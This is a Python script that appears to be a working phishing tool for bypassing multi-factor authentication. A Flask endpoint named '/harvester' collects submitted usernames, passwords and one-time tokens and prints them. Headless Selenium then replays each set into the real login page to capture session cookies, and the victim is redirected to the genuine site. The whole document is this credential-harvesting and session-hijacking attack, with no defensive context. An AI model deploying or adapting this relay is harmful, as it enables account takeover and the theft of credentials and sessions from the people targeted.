import json
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from flask import Flask, request, redirect

# Parameters
loginURL = 'http://dundermifflin.com/login' # Update this with the URL path to the target MFA app

def createBrowser():  
    opts = Options()
    opts.headless = True
    driver = webdriver.Firefox(options=opts)
    driver.implicitly_wait(60)
    return driver

def login(username, passwd, token):
    driver = createBrowser()
    driver.get(loginURL)
    driver.find_element_by_id('username').send_keys(username)
    driver.find_element_by_id('password').send_keys(passwd)
    driver.find_element_by_id('token').send_keys(token)
    driver.find_element_by_id('submit').click()
    cookies = json.dumps(driver.get_cookies())
    driver.close()
    return cookies

app = Flask(__name__)
@app.route('/harvester', methods = ['POST'])
def harvest():
    username = request.form['username']
    passwd = request.form['password']
    token = request.form['token']
    print('\n=========== REPLAYING CREDENTIALS ========')
    print(f'\n[!] USERNAME - {username}')
    print(f'\n[!] PASSWORD - {passwd}')
    print(f'\n[!] TOKEN - {token}\n')
    print('\n=========== COOKIES AFTER REPLAY ========')
    cookies = login(username, passwd, token)
    print(cookies)
    return redirect(loginURL, code=307)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
